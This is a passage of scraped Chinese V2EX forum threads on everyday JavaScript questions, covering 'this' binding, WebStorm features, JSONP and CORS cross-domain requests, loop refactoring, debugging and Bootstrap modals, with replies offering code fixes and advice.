obj2 = new fn();    //undefined\r", "```", "每次用 this 之前，console.log(this) 就好了。\r", "因为 this 是在运行时确定的。", "感谢所有回复的童鞋，Javascript高级程序设计已在京东下单，现在开始挨着看看楼上各位提供的链接", " 这篇居然没讲到 func.bind()", "看这本书 ", " 谢谢，我有找到这本书的github page :) ", "\r", "这里面的3", "首先 use strict\r", "其次 var _ = this\r", "再次 bind,apply,call", " 简单明了 :) 谢谢", "看看winter大神的这篇吧\r", "\r", "我和楼主相反，先学的js，后学的python，突然改用self还有点不习惯。js的this刚开始也是很容易晕菜，其实js的内置类型都是对象，谁调的方法，方法里的this就指哪个对象。call和apply可以将方法用指定对象调用。另外如果用框架或者别人封装的方法，那就要看文档怎么说了，或者你打印一下就知道了"]},
{"content": ["<div class=\"topic_content\">之前都是用Sublime，这周用了WebStorm后发现再也回不去了...虽然很多特色功能通过安装插件Sublime都能实现，但还是决定换到WebStorm，特介绍几个收去了我的膝盖的功能：<br><br>1. 绑定Chrome，在IDE中进行JS代码调试（末尾放了个介绍这个功能的u2视频）<br>2. ctrl + 鼠标左击 跳转方法定义（**话说我跳转后要怎么快速的返回来的地方呢？**）<br>3. Alt + F7 Find Usages 查找当前选中代码在项目中的使用<br>4. 类似Sublime插件gitgutter 标记有改动的行，并且更加便捷的提供show diff功能，再而且更改后的文件在左侧文件目录里也会被蓝色高亮文件名（**话说怎么快速看到哪些行被改动了呢？**）<br>5. 比sublime设计更好的右侧（放大镜）预览功能<br><br>请教还有什么大招吗？<br><br><iframe id=\"ytplayer\" type=\"text/html\" width=\"660\" height=\"420\" src=\"//www.youtube.com/embed/jwubF2gmLNQ\" frameborder=\"0\" allowfullscreen></iframe></div>", "<div class=\"topic_content\">自问自答<br><br>**话说我跳转后要怎么快速的返回来的地方呢？**<br>ctrl+alt+左/右<br>**话说怎么快速看到哪些行被改动了呢？**<br>ctrl+shift+alt+上/下</div>"], "reply": "32", "tittle": "WebStorm 是我用过最智能的 JS IDE 了，抛砖引玉介绍几个非常中意的功能", "comment": ["买的么？", " 嗯，试用了一周后就回不去所以就买了", "所以我现在开发完整项目都是用webstorm", "Sublime Text 对我来说就一跨平台的记事本而已\r", "\r", "写代码必须用IDE才行...", " 真的好贵额", " 不算贵了，上个月才打完折，我都买了个IDEA旗舰版了", "首先，处理器要够快，内存要够大...", "其实一开始让我用WebStorm。。 我是拒绝的,看了楼主的介绍我决定试一试！+特技", "用了两年WS，正在把 VIM 打造为 WS", "更多大招看知乎上的回答： WebStorm 有哪些过人之处？", "问一下深入用过WebStorm和Sublime Text的同学：\r", "WebStorm的跳转方法定义是简单的正则文本的结果还是根据语言有理解逻辑？\r", "有什么Sublime Text装上相应插件后没有的功能吗？或更好用的功能吗？", " \r", "Sublime Text 可以用 SublimeCodeIntel，不过明显没有 WebStorm 跳的准确。", " Sublime 的语言包根据正则判断 socpe，Sublime 再根据 socpe name 生成两份 index ： 当前文件 和  project。不过 Sublime 只提供了最基础的功能，有些限制，所以能用没问题 算不上强大。", " 基于 AST（语法树），这是整个集成环境体系的根本\r", "\r", "scope 竟然连续打错了两次...", "IDEA中使用最多的双击shift搜索，ws应该也一样", "不喜欢IDE，感觉IDE是用来管理代码的。而不是用来写代码的。。。\r", "\r", "太重了，项目没超过5MB，用这些IDE真的重。", "关于3. 这一点务必在keymap里映射到鼠标上，比如ctrl+alt+点击，和ctrl+点击配合起来的感觉……绝对戒不掉的=w=（个人偏好show usage那个销魂的小窗）\r", "\r", "关于跳转 F2跳到下个黄线/红线，ctrl+shift+backspace跳到上次编辑过的地方，另外xxx+N(windows)/xxx+O(mac)的搜索类/文件名/符号名的功能，是支持选区的，也就是先选中一段内容再按……\r", "\r", "还有聚焦到webstorm（而非J家）的话，膝盖必须是SpyJS的啊 ", "\r", "\r", "哎……J家IDE的好处每天说一条一年也说不完啊", "告诉你一个杀手级的快捷键(Linux 下）： ctrl-w，按作用域选择。\r", "我觉得 JB 家 IDE 最厉害的功能是 refactor！简直无敌。我用 RubyMine ，重命名，提取方法等等 refactor 功能真是太方便了。", "＠ChiangDi JetBrains  可以乱简写么？\r", "其实还有ctrl + t/k 配合git pull/push,\r", "alt + home\r", "配合bug 平台可以导入task.\r", "看看 keymaps 里面, 会发现更多. \r", "\r", " @", " @", " @", " @", " @", " @", "  @", " @", " @", " @", " @", "  @", " \r", "大家喜欢就买吧. 国内可以五折其实也没多少钱.", "jetbrains 家的东西都好用，基本上都用过了。不过可耻的是盗版，打算项目奖金到了买个IDEA", "JB家的都在用，学生可以免费，很爽~~", "alt+上：按照语义逐步扩展选区。\r", "\r", "我映射成了Ctrl-Alt-Space", " \r", "\r", "bug\r", "\r", "\r", " 233333333333333333333", "大杀器是  默认快捷键 ctrl + w", "JS语法提示还是硬伤", "js 语法提示很猛的。或许是你没注释啥的。。。", " 现在应该没有五折活动了吧，我现在用的 PhpStorm 7，前年买的，到期一直没续费也升不了 8。如果有五折我就重新买不续费了……", "注释没有缩进的问题大家怎么解决的？", " 许愿，还愿机制。比如考试不挂科，我就买买买。\r", "或者诅咒机制，不买就找不到女py。", " \r", " \r", " \r", "是的，我就是觉得St不准确，根本不是从语义出发的，一直觉得毕竟是个文本编辑器，放过自己放过它，呵呵。"]},
{"content": ["<div class=\"topic_content\">RT。<br>举例如<br>var table_foo = [{id:1,foo:a},{id:2,foo:b}];<br>var table_bar = [{id:1,bar:x},{id:1,bar:y},{id:2,bar:z}];<br>可以执行类似 select foo,bar from table_foo  join table_bar on table_foo.id= table_bar.id<br>得到如下的数组:<br>[{foo:a,bar:x},{foo:a,bar:y},{foo:b,bar:z}]<br><br>不一定要支持sql语法，功能对就可以了。</div>"], "reply": "7", "tittle": "寻可用 js 组件，需要在对象数组上进行类似 SQL 的查询。", "comment": ["这不是一个ford的事么……", "lodash", "XY问题", "不是能搜索到的吗\r", " \r", "感谢。\r", "我不幸堕入伸手党的深渊。", "\r", "就是我要的。", "蛋疼"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>function(x,y){<br>\nthis.repeatMap = function (repeatX, repeatY) {<br>\n    this.repeatX = repeatX;<br>\n    this.repeatY = repeatY;<br>\n    return this;</p>\n\n<p>}</p>\n\n<p>this.aMartix= function (){<br>\n    var flagMatrix = new Array();<br>\n    for ( i = 0; i &lt; tileNumX; i++) {<br>\n        flagMatrix[i] = new Array();<br>\n    }</p>\n<div class=\"highlight\"><pre>for ( x = 0; x &lt; tileNumX; x++) {\n    for ( y = 0; y &lt; tileNumY; y++) {\n\n        flagMatrix[x][y] = new repeatMap(repeatX, repeatY);\n        //这里报错了\n        }\n    }\n</pre></div>\n\n<p>}</p>\n\n<p>}</p>\n</div></div>"], "reply": "15", "tittle": "js 中的对象问题，这个写法该怎么改？", "comment": ["repeatMap是对象的方法，将 new repeatMap() 改为 this.repeatMap() 试试", "var that =this;\r", "new that.repeatMap()", "报的什么错？", "this 的作用域发生改变 可以使用 \r", "function Set(){\r", "    this.x=1;\r", "}; \r", " Set.prototype.get=function(){\r", "    console.log(this.x)\r", "}", " undefine is not a function", "flagMatrix[x][y] = new repeatMap(repeatX, repeatY);\r", "\r", "执行的时候 ，寻找的是局部方法，this. repeatMap绑定到this上了。\r", "\r", "var that = this;\r", "\r", "function repeatMap (repeatX, repeatY) {\r", "that.repeatX = repeatX;\r", "that.repeatY = repeatY;\r", "return that;\r", "\r", "}\r", "\r", "this. repeatMap = repeatMap;\r", "\r", "\r", "不过楼主你这玩意写的真烂，完全不懂js的基本做法。", " 确实是写的烂，，现在对js还停留在简单的DOM操作水平", "lz身边没明白人\r", "\r", "把js搞成莫名奇妙的js了", "repeatX ,repeatY未定义吧", "this在不用context下指向的对象是不用的，在构造函数指向新建的对象", "谢谢各位，已经基本弄明白了", "第一次见这么写js...　不同改了，全部删掉，先补补js知识重写吧，指不定你后面又写出什么", " 有哪些问题比较严重的求指出，感谢，说实话自己看书还是悟性还是不够", "1. `repeatMap` 完全没有必要作为上下文的函数.\r", "2. 如果`repeatMap`作为构造函数，是不需要`return this`.\r", "3. `js`里声明数据，通常直接使用 `var a = []`; 声明对象`var obd = {}`\r", "4. `flagMatrix[x][y] = new repeatMap(repeatX, repeatY)`这里的`repeatX`和`repeatY`又是什么鬼", " 谢谢回复，第一个我现在是明白了，2和4的话其实这是一个游戏里面的一小段代码，我没有写明白，第3点我试试优化一些，自己的习惯是不太好"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><div class=\"highlight\"><pre><span class=\"nt\">&lt;script </span><span class=\"na\">src=</span><span class=\"s\">'https://www.v2ex.com/api/topics/latest.json?callback=cbfunc'</span><span class=\"nt\">&gt;&lt;/script&gt;</span>\n</pre></div>\n\n<p><code>以上</code></p>\n\n<ul>\n<li>callback 无法执行;</li>\n<li>不知道姿势对不对.</li>\n</ul>\n</div></div>"], "reply": "19", "tittle": "请问: 有什么办法跨域调用本站的 API? JSONP 好像不支持!", "comment": ["scheme", "返回的就是个json格式数据，貌似不支持 jsonp 调用？", "本地跑一下这个API，原封不动给出数据，js调用这个", "CORS 开了吗", " \r", " \r", "\r", "所以, 只能自己再起个后台服务了.", " 这个需要 v2ex 打开吧...", " \r", "\r", "\r", "cache-control:max-age=120\r", "date:Wed, 18 Mar 2015 09:33:36 GMT\r", "etag:\"53ababd37e6ce8cb5ef2b0278246c0a15ab3791f\"\r", "expires:Wed, 18 Mar 2015 09:35:20 GMT\r", "google:XY\r", "server:nginx\r", "status:304\r", "vary:Accept-Encoding\r", "version:HTTP/1.1\r", "x-rate-limit-limit:60\r", "x-rate-limit-remaining:59\r", "x-rate-limit-reset:1426672800\r", "\r", "\r", "没开", "返回结果是 Array，直接劫持试试： ", " \r", " 可以自己做一份 HTTP 代理然后在 header 里加上。", "  +1 \r", "最简单的解决方法就是在自己的后端的写个代理服务中转下了\r", "JSONP 需要服务端支持，如果提供api的服务端不支持JSONP的话，就不能用", "额。。。目测v2ex只提供了json接口，不是jsonp接口，callback参数没输出", " 那不是脱裤子放屁么。", " 搭个桥怎么能是脱裤子放屁呢", " 好吧，我以为他说的是 HTTP Header。仔细看了一下，他说的应该是HTML HEADER", "可以用这个: ", "后端服务要支持JSONP才行吧", "你可以用YQL中转，那个支持CORS的", "服务端用socket获取url，执行js，结果返回给你的前端。 说白了就是做个转发，当年没有cors，人人这么搞。", "jsonp需要后端写代码抓你的callback的，静态资源不能jsonp"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>for(x=0;x&lt;8;x++){<br>\nif(x==0||x==8){<br>\ny=1;<br>\n}<br>\nif(x==1||x==7){<br>\ny=2;<br>\n}<br>\nif(x==2||x==6){<br>\ny=4;<br>\n}<br>\nelse{<br>\ny=6;<br>\n}<br>\nfor(y;y&lt;6;y++)<br>\n{<br>\n//...<br>\n}<br>\n}</p>\n</div></div>"], "reply": "15", "tittle": "这种循环判断如何优化呢", "comment": ["\"优化\"的目的是什么?\r", "代码好看还是性能? 前者可以查表,后者忘了吧.", "方案一：预置一个类似映射关系的数组，计算过程直接读取\r", "int Y[8] = {1, 2, 4,  6, 6, 6, 4, 2, 1}\r", "for (int x = 0; x < 8; x++) {\r", "    int y = Y[x];    \r", "}\r", "\r", "方案二：尝试建立动态的映射关系，计算过程中动态执行计算\r", "int Y(int x) {\r", "    if (0 <= (x%8) && (x%8) <= 2) {\r", "        return power(2, x%8);\r", "    } \r", "    return 6;\r", "}\r", "for (int x = 0; x < 8; x++) {\r", "    int y = Y(x);    \r", "}\r", "\r", "以上，就是简单的两种思路吧，\r", "方案一基于空间换时间的思想，\r", "可以节省相应的映射计算开销，保证较好的查询效率；\r", "\r", "方案二基于时间换空间的思想，\r", "如果可以找到比较高效的映射函数，\r", "一方面不会浪费存储资源，另一方面也可以实现较好的执行效率", "另外，如果使用switch-case 而不是连续的if，编译器会帮你创建楼上方案1的那种优化方式。", " 受教！", "switch-case 大法好。C 语言里边最高级的表达式。\r", "\r", "for (x = 0; x < 8; x++) {\r", "        switch (x) {\r", "        case 0:\r", "        case 8:\r", "                y = 1;\r", "                break;\r", "        case 1:\r", "        case 7:\r", "                y = 2;\r", "                break;\r", "        case 2:\r", "        case 6:\r", "                y = 4;\r", "                break;\r", "        default:\r", "                y = 6;\r", "                break;\r", "        }\r", "\r", "        for (; y < 6; y++) {\r", "        }\r", "}", "  方案二 （6 % 8 = 6）、（7 % 8 = 7）", "很显然要用switch", "switch吧", "数组:  [0, 1, 2, 3,   4, 5, 6, 7, 8]\r", "1.=> [0, 1, 2, 3,   4, 3, 2, 1, 0]   <= 按照下标5做镜像.  f(y) = 4-|x-4|, 得到\r", "2.=> [1, 2, 4, 8, 16, 8, 4, 2, 1] <= 按照需求做指数曲线 f(y) = 2 ** x\r", "\r", "判断小于6 其实就是判断第一步中元素小于3. \r", "由 f(y) < 3 得 4-|x-4| < 3, 进而得到 x> 5, 或者x<3 成立.\r", "综上可得:\r", "\r", "if (x<3 || x>5){\r", "    // 分开写可以简化绝对值\r", "    y = 2 ** (4-|x-4|)  \r", "}else{\r", "    y = 6\r", "}\r", "\r", "使用switch也可以.", "支持 @", " 的方法1， \r", "在输入和输出的数量有限的情况下，先做一次预计算，把表算出来。之后都查表。", "我来给你们展示下不可读的优化：\r", "\r", "function for1() {}\r", "function for2() {}\r", "function for3() {}\r", "\r", "var tasks = [for1, for2, for3, for3, for2, for1];\r", "for (var i = 0; i < 8; i++) {\r", "    tasks[i]();\r", "}", " 多谢指正，粗心大意了 :) \r", " 方案二的Y()可能实现的有些小问题，简单更正一下，\r", "\r", "int Y(int x) {\r", "if (6 <= x && x <= 8) {\r", "    x = 8 - x;\r", "}\r", "if (0 <= x && x <= 2) {\r", "return power(2, x);\r", "} \r", "return 6;\r", "}", " 另外数组应该至少有9个元素，外部x迭代值的边界条件也需要更正一下，再次更正一下两个方案 :)\r", "\r", "方案一：\r", "int Y[9] = {1, 2, 4, 6, 6, 6, 4, 2, 1}\r", "\r", "for (int x = 0; x < 9; x++) {\r", "    int y = Y[x]; \r", "    // do something else\r", "}\r", "\r", "\r", "方案二：\r", "int Y(int x) {\r", "    if (6 <= x && x <= 8) {\r", "        x = 8 - x;\r", "    }\r", "    if (0 <= x && x <= 2) {\r", "        return power(2, x);\r", "    } \r", "    return 6;\r", "}\r", "\r", "for (int x = 0; x < 9; x++) {\r", "    int y = Y(x); \r", "    // do something else\r", "}", "这种自然建议switch，代码可读性也高很多。", "我第一眼也是想到了switch。\r", "其实你要说明优化的方向，是可读性还是存储还是计算？\r", "其实用javascript这么高级的语言，个人的观点是可读性比性能重要，所以优化主要是在可读性上优化，你的代码用switch就会有很好的可读性，容易维护。"]},
{"content": ["<div class=\"topic_content\">首先，我知道在devtool中，选中某个js文件，在行数那里点击右键能够有‘add conditional breakpoint’的选项出来，但和我的需求有点差异。<br><br>我的场景是没有具体某个js文件，在当前项目在浏览器加载的时候，有一个sTemplateName的变量，每当这个变量被赋值（或者是第一次被赋值）的时候，break在那个位置，就像是写了个debugger在那里一样，不知道有没有可能，求助大牛！</div>"], "reply": "2", "tittle": "用 chrome devtool 调试 js 代码能设置 conditional break point 吗？", "comment": ["这个chrome devtool里没有，但可以试试这个：\r", "chrome devtool 是有这功能滴，引入一个叫 debugger 的东西\r", "\r", "按你的需求可以这么写，判断所需要判断的变量，然后走该走的分支就行了啊：\r", "\r", "<script>\r", "        var sTemplateName = false;\r", "\r", "        if (sTemplateName) {\r", "            debugger;\r", "        } else {\r", "            console.log('yeah!');\r", "            sTemplateName = true;\r", "        }\r", "\r", "        setTimeout(function () {\r", "            if (sTemplateName) {\r", "                debugger;\r", "            } else {\r", "                console.log('yeah!');\r", "            }\r", "        }, 1000);\r", "</script>"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>今天无意中浏览到了 Zelaer 的 二手 页面<br>\n<a target=\"_blank\" rel=\"nofollow\" href=\"http://fix.zealer.com/rephone\">http://fix.zealer.com/rephone</a><br>\n前端大神们，帮我分析一下此页面除了 jquery 还用到了什么 前端框架，或者 前端发布的 工具？<br>\n比如，资源都是压缩的，并且文件名包含随机命名，防止被浏览器缓存 等等~<br>\n我只了解大概的概念，不知道具体用到的 框架 和 发布工具<br>\n谢谢~~</p>\n</div></div>"], "reply": "17", "tittle": "各位“前端大神”，这个页面用到了什么前端框架？和前端的发布工具？", "comment": ["这貌似是JASKIN写的？", "好可怜的没人回复。那么我就写一下吧。\r", "首先资源真没压缩。所以基本源码一路了然。 combo貌似是自己实现的一个类似整合cmd和简单的backbone的东西。所谓的文件名随机数应该是一个md5吧，用来区别版本和更改。其他就没有了。非常简单的。", "好像用了require异步\r", "FIS工具", "应该是自己写了个模块化的框架，装个node插件可以实现发布时带上hash版本号。算半压缩吧，只是去掉了空格和换行", " fis据说是个渣", " 请问这是什么插件", " 感谢，这个插件非常好用", " jj burst", " 没有D3啊。 哪用到D3 了。", "这个页面像是用了PageSpeed。\r", "看使用环境和文件更新频率，CSS与JS文件压缩可以用YUI Compressor或者PageSpeed。", "[img]", "?1[/img]\r", "貌似就是那么几种", " 看了下代码应该是误报，最多还用了一个JQuery的插件", " 偶尔会误报\r", "\r", "话说刘翔也开始卖二手了？", " 感谢，插件好用 不用去查看HTTP Headers 了", " 感谢呀~插件好好用", "用gulp就好了"]},
{"content": ["<div class=\"topic_content\">估计JS原生的for loop效率应该更高一些，但有没有什么办法看看具体执行效果呢？譬如在循环开始前插入一句start()，退出loop的时候插入一句end()？</div>"], "reply": "5", "tittle": "请问如何看代码执行效率呢？( jQuery each vs. JS for loop）", "comment": ["自己在开始结尾打印时间不就可以了么。。。", "console.time('test');\r", "...\r", "console.timeEnd('test');", " 为何很多测试在这个网站上做的呢?", " 因为这个网站就是做“代码效率比较”的"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>本人在写一个web app，因为是初学js，所以水平有限，不过demo完成后，进行测试的时候，移动端的chrome最流畅，其次uc浏览器，qq浏览器和移动版的safari页面切换都有延迟感觉。<br>\nps. chrome uc qq都是在nexus5上测试的，safari是在iphone5/6。 可是印象中一直是safari表现和chrome差不多或者更好，请问这个是不是和js的代码实现和水平有很大关系，对于解决这种延迟感有没有什么经验分享啊，就是性能和优化的经验。</p>\n</div></div>"], "reply": "10", "tittle": "关于前端开发的疑惑", "comment": ["用浏览器的开发者工具看看速度", "请学习 HTTP 协议。跟 JS 没关系。", " 是异步加载的，加载完成后的一些页面切换", " 比较像native app那样的web app", "如果不了解HTTP，前端优化就别谈了。", " 可是异步加载完成后，都是靠js在运行啊，和http没有关系了吧， 没有进行通信啊。", " 异步加载就是 HTTP加载。请查看是否 HTTP 请求过多，每个 HTTP 请求时间耗费在哪个阶段。每个浏览器都看。", "把一些动画效果改成css3实现试试?", " 我想他说的可能是加载完成以后的DOM操作。\r", " 我建议你把代码post到Gist或者Github，否则没有人可以帮你。。。", "..亲测，安卓和ios的浏览器渲染方式不一样。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>在使用backbone的router的时候，遇到个很奇怪的bug，就是会偶然出现router失效的情况，对于这一类很难重现，不知道如何发生的bug该如何调试－ －</p>\n</div></div>"], "reply": "6", "tittle": "前端 js 遇到难以重现的 bug 该怎么办", "comment": ["每个地方先记录log，能多详细多详细--包括返回值什么的\r", "做一个开关，先开着记着，好了就关掉\r", "至少之后能尽量模拟一次数据回放", "JS, 因为异步的关系, 很多 bug 一般都是因为执行顺序不符合你的预期导致的.\r", "\r", "先看看执行次序吧?", "洗个澡，就想出来了", "_(:з」∠)_不能重现就不是bug", " 不是开玩笑，真有过这种经历", "let go"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>根据这个Post做的<br>\n<a target=\"_blank\" rel=\"nofollow\" href=\"http://stackoverflow.com/a/8983053/4196468\">http://stackoverflow.com/a/8983053/4196468</a></p>\n\n<p>演示文档： <a target=\"_blank\" rel=\"nofollow\" href=\"http://plnkr.co/edit/NePR0BQf3VmKtuMmhVR7?p=preview\">http://plnkr.co/edit/NePR0BQf3VmKtuMmhVR7?p=preview</a></p>\n\n<p>在演示里面完全没有问题，但是我实际使用的时候却根本没办法处理URL</p>\n\n<p>讲一下我的情况，一个系统从数据库读取数据后通过While Loop 放到一个表格中，每行一个数据，每个数据有不同的信息，然后每个数据（每行）有一个可以删除的按钮来删除数据</p>\n\n<p>每个删除是提交到另外一个PHP页面中解决的，PHP 页面通过GET（或者POST）来确认数据的ID然后删除这个数据</p>\n\n<p>现在为了避免用户无意删除东西，需要加一个确认的步骤，按照上面那个StackOverflow处理了之后却发现根本没办法用，没有办法去Pass PHP页面地址</p>\n\n<p>下面贴上Code大家帮忙看看哪里出问题了</p>\n<div class=\"highlight\"><pre>&lt;script type=\"text/javascript\"&gt;\n$('#cyclist-show button').on('show.bs.modal', function(e) {\n$(this).find('.btn-ok').attr('href', $(e.relatedTarget).data('href'));\n\n$('.debug-url').html('Delete URL: &lt;strong&gt;' + $(this).find('#cyclist-show button').attr('href') + '&lt;/strong&gt;');\n});\n</pre></div>\n\n<p>&lt;/script&gt;</p>\n<div class=\"highlight\"><pre>$result = search_id($dbc, $id);\n\n    if ($result != false &amp;&amp; $result -&gt; num_rows != 0) {\n        echo \"&lt;div class = 'table-responsive'&gt;\";\n        echo \"&lt;table class='table-responsive' id='cyclist-show' align='center'&gt;\";\n            echo \"&lt;tr&gt;\n</pre></div>\n\n<p>.... 省略</p>\n<div class=\"highlight\"><pre>&lt;/tr&gt;\";\n        while($row = mysqli_fetch_assoc($result)){\n</pre></div>\n\n<p>... 省略</p>\n<div class=\"highlight\"><pre>echo \"&lt;td id='cyclist-button-td'&gt;\";\n                                echo \"&lt;div class='hidden-xs'&gt;\";\n                                ?&gt;\n                                &lt;button class=\"btn btn-default\" data-href=\"./delete-bicycle.php?id=\"&lt;?php echo $row['ID'] ?&gt;\" data-toggle=\"modal\" data-target=\"#confirm-delete\"&gt;\n                                Delete\n                                &lt;/button&gt;\n                                &lt;?php\n                                echo \"&lt;/div&gt;\";\n                                echo \"&lt;/td&gt;\";\n</pre></div>\n\n<p>....... // 省略<br>\n            }<br>\n            echo \"&lt;/table&gt;\";<br>\n            echo \"&lt;/div&gt;\";<br>\n        } else {<br>\n            echo \"&lt;/br&gt;You do not have any bicycle that registered with system\";<br>\n        }<br>\n    ?&gt;<br>\n&lt;/div&gt;<br>\n&lt;/section&gt;</p>\n<div class=\"highlight\"><pre>&lt;div class=\"modal fade\" id=\"confirm-delete\" tabindex=\"-1\" role=\"dialog\" aria-labelledby=\"myModalLabel\" aria-hidden=\"true\"&gt;\n    &lt;div class=\"modal-dialog\"&gt;\n        &lt;div class=\"modal-content\"&gt;\n\n            &lt;div class=\"modal-header\"&gt;\n                &lt;button type=\"button\" class=\"close\" data-dismiss=\"modal\" aria-hidden=\"true\"&gt;&amp;times;&lt;/button&gt;\n                &lt;h4 class=\"modal-title\" id=\"myModalLabel\"&gt;Delete Confirmation&lt;/h4&gt;\n            &lt;/div&gt;\n\n            &lt;div class=\"modal-body\"&gt;\n                &lt;p&gt;You are about to delete this, this procedure is irreversible.&lt;/p&gt;\n                &lt;p&gt;Do you want to proceed?&lt;/p&gt;\n                &lt;p class=\"debug-url\"&gt;&lt;/p&gt;\n            &lt;/div&gt;\n\n            &lt;div class=\"modal-footer\"&gt;\n                &lt;button type=\"button\" class=\"btn btn-default\" data-dismiss=\"modal\"&gt;Cancel&lt;/button&gt;\n                &lt;a class=\"btn btn-danger btn-ok\"&gt;Delete&lt;/a&gt;\n            &lt;/div&gt;\n        &lt;/div&gt;\n    &lt;/div&gt;\n&lt;/div&gt;\n</pre></div>\n</div></div>", "<div class=\"topic_content\">说明下，确认的对话框可以弹出，但是点OK/确认 后没有反应，应该是URL没有被输入到JavaScript中</div>"], "reply": "8", "tittle": "使用 Bootstrap 的确认弹窗（ Confirmation Box）的时候，用 JavaScript 去处理确认和取消按钮。如果这个需要设置弹窗的这个按钮在一个 While Loop 里面的话怎么办呢？", "comment": ["其实这就是把异步变成同步啦，也就是 C# 中 async/await 解决的问题：用顺序的代码写异步的操作……\r", "然后，我也挺想知道这些 alert/confirm/prompt replacement 是怎么解决这个问题的……\r", "关注一下 ><", " 说的有点高深没太懂，所以按照我的这个问题怎么解决呢？", "你看看页面出了什么错误? 代码应该没问题的.\r", "就是触发了事件, 就把确认的按钮的 href 替换成 data-href.", "别改别人的代码就可以了... 把 `#cyclist-show button` 改回成 `#confirm-delete`.\r", "`$(this).find('.btn-ok')` 出现问题了.", " \r", "首先非常感谢您~\r", "\r", "刚开始的时候用的就是#confirm-delete但是不好用所以才改成 #cyclist-show button的\r", "\r", "页面上没有提示任何错误所以有点不知所措了~", " 我也依照这个Post在我写的一个Flask应用里测试，但是也不行，而且找不到原因，最后我用了bootbox.js\r", " 无非就是回调或者根本不解决…", "没有效果也没有错误，基本上只可能是事件没绑上，检查一下执行顺序吧。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>需要一个能在图片上圈点做标记的 js 类库，类似QQ空间的圈人那种，可能用谷歌的搜索方式不对，没找到。项目急需用到，同学们指点下。。。tks</p>\n</div></div>"], "reply": "1", "tittle": "需要一个能在图片上圈点做标记的 js 类库，有知道的吗", "comment": ["paper.js之类用canvas或SVG的库"]},
{"content": ["<div class=\"topic_content\">&lt;html&gt;<br>&lt;head&gt;<br>&lt;script type=\"text/javascript\"&gt;<br>function alertValue()<br>  {<br>  alert(document.getElementById(\"text1\").value)<br>  }<br>&lt;/script&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br><br>&lt;form&gt;<br>&lt;input type=\"text\" id=\"text1\" value=\"Hello world!\" /&gt;<br>&lt;input type=\"button\" id=\"button1\"  onclick=\"alertValue()\" <br>value=\"Show default value\" /&gt;<br>&lt;/form&gt;<br><br>&lt;/body&gt;<br>&lt;/html&gt;<br><br>我想这样<br>&lt;html&gt;<br>&lt;head&gt;<br>&lt;script type=\"text/javascript\"&gt;<br>alert(document.getElementById(\"text1\").value)<br>&lt;/script&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br><br>&lt;form&gt;<br>&lt;input type=\"text\" id=\"text1\" value=\"Hello world!\" /&gt;<br>&lt;input type=\"button\" id=\"button1\"  onclick=\"alertValue()\" <br>value=\"Show default value\" /&gt;<br>&lt;/form&gt;<br><br>&lt;/body&gt;<br>&lt;/html&gt;<br>就无法弹出alert，何解？</div>"], "reply": "1", "tittle": "为什么只有在 function 里才能 alert document.getElementById(\"text1\").value，无法直接 alert document.getElementById(\"text1\").value", "comment": ["因为alert的时候,要alert出来的东西还没有加载,把alert放在要alert的东西底下就好了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>有两个子域名，a.xx.com和b.xx.com，现在我在a.xx.com一个页面中发送ajax请求b.xx.com一个控制器中的方法，希望得到返回数据，但是返回状态302，应该是跨域问题没有解决。</p>\n\n<p>网上有很多方法解决子域名跨域，但比较杂乱，说说一般常见的专业做法是怎样的，谢谢！</p>\n</div></div>"], "reply": "32", "tittle": "ajax 在子域名下跨域的问题", "comment": ["302为什么\"应该是跨域问题没有解决\"\r", "能不能讲一下你的思路", " 中添加 Access-Control-Allow-Origin: ", " 即可，详细的请查相关文档。", "jquery的jsonp可以解决跨域问题\r", "lz可以自己查一下", " 在b.xx.com的页面请求b.xx.com的方法返回是正常的，状态200，同样的js代码在a.xx.com请求返回状态302，被跳转。", "明显LZ应该先解决b站服务端对于非同域请求返回302的问题。这跟ajax无关了。", " 解决了跨域也就解决了302，302就是非法请求跳转了", " ", " 请求 ", " 就是跨域了。\r", "所以根源就是跨域问题。上面已经有人告诉你方法了：\r", "jsonp 或 设置 Access-Control-Allow-Origin", " 你在哪里的文档看到 302 是『非法请求』……", "302原来叫非法请求跳转。。长见识了", " \r", " \r", "请问我有讲302是非法请求跳转吗，请理解别人说话的意思，表达不严谨请见谅！发现在v2ex上很多人真的是不对问题进行讲解，却擅长喷人。", "这个问题就是讨论ajax跨域如何解决的问题，还是用jsonp吧。http://www.tantengvip.com/2015/04/jsonp-ajax/", " \r", " \r", "请理解我回复的意思，请求ajax用firefox查看不成功，状态码302，location：其他一个网址。正常的情况是返回状态200，并且显示字节长度等。", " jsonp不支持post,最理想的还是后端开域名白名单", "302就不是跨域了", " 也许我的文字表达能力薄，导致你对我的留言有所误解，在此先道个歉。\r", "我很久之前也处理过类近的问题，而浏览器只是直接返回错误（具体的忘记了），并没有出现 302 。\r", "\r", "据我记忆，302 是伺服器端返回的，而使用AJAX 技术的话302 会被浏览器无视的（除了使用 Access-Control-Origin 外）[0]。如果伺服器返回 302 的话，这问题大概和客户端无关。我从而推断出你有可能在伺服器端使用了一个特殊程序，在遇到错误的跨站请求时会返回 302 。因此我想问问你伺服器端是不是自己写的代码，如果不是的话那是不是在文档里看到『非法请求跳转』这一字串。因为对于一个API 产品/服务来说，这个是常见问题，估计文档会直接给出方法。\r", "\r", "既然场景可以使用 jsonp 的话那就再好不过了，我的场景使用POST，所以不行。\r", "\r", "[0]: ", " 那你教教我怎么理解你6楼的回复？浏览器跨域限制跟server返回什么状态码压根就没有直接关系。搞清这两个概念再下结论也不迟不是？", "我也根本没有看出是跨域问题，估计是服务端根据referer, cookie ，session之类的判断跳转了", "看到6楼跟10我竟然笑了", "我觉得大家还是散了吧。LZ玻璃心又觉得我们理解不对。", " 你六楼有讲，谢谢", "以前跨域都是jsonp或iframe，现在解决方案成熟很多，你可以搜一下“Angular通过CORS实现跨域方案”", "302不是跨域问题，是跳转。\r", "你关了Chrome默认的安全设置再试试就知道了。\r", "想必是你目标网站的Apache之类服务做了放盗链，你想要盗链，Header中要附上Refer", "其实是误会 为什么是误会 